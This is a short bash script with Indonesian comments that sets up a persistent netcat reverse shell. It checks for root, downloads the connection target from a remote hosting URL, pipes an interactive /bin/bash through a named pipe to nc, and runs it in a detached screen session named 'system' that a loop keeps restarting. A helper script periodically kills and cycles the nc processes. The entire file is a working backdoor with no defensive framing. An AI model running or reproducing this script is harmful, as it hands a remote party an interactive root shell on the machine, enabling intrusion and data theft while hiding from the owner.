#!/bin/bash
# wajib ada screen, jika tak ada install manual apt install screen
# jangan beri nama file ini dengan nc atau netcat agar saat pgrep terhindar dari doble pid
if [[ "$(id -u)" != "0" ]];then
 echo "    GAGAL !!!,kamu harus dalam mode root"
 exit 0
fi

echo 'sleep 10;while [ "$(pgrep -f nc)" != "" ]; do sleep 120; echo "nc dimatikan"; kill -9 $(pgrep -f nc); done;exit 0' > /tmp/kill.sh
chmod +x /tmp/kill.sh

rm -rf /tmp/f

mkfifo /tmp/f

while true; do

 if [ "$(pgrep -f ./nc)" = "" ]; then
  IP=$(curl -s https://ibnusaja.nasihosting.com/temp.txt)
  echo "masuk di true"
  # PORT="29399"
  # nohup matikanNc > /dev/null 2> /dev/null &
  echo "cat /tmp/f | /bin/bash -i 2>&1 | nc $IP > /tmp/f" > /tmp/nc.sh && chmod +x /tmp/nc.sh && sleep 2
  screen -wipe
  screen -AmdS system /tmp/nc.sh # run NC
  if [ "$(pgrep -f ./kill.sh)" = "" ]; then
   screen -AmdS system2 /tmp/kill.sh
  fi
 else
  echo "ke skip karena nc sudah jalan"
 fi

 echo "sudah jalan"
 sleep 3
done
